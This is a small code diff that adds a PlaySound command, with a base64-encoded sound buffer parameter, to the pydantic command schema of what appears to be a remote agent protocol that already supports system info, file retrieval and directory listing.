@@ -12,6 +12,7 @@ class CommandType(str, enum.Enum):
     GetSystemInfo = "GetSystemInfo"
     GetFile = "GetFile"
     DirList = "DirList"
+    PlaySound = "PlaySound"
 
 
 class BasicCommand(BaseModel):
@@ -56,4 +57,13 @@ class DirListParameters(BaseModel):
 class DirListCommand(BasicCommand):
     command_type: CommandType = CommandType.DirList
     parameters: DirListParameters
+
+
+class PlaySoundParameters(BaseModel):
+    sound_buffer: str  # base64 encoded
+
+
+class PlaySoundCommand(BasicCommand):
+    command_type: CommandType = CommandType.PlaySound
+    parameters: PlaySoundParameters
 
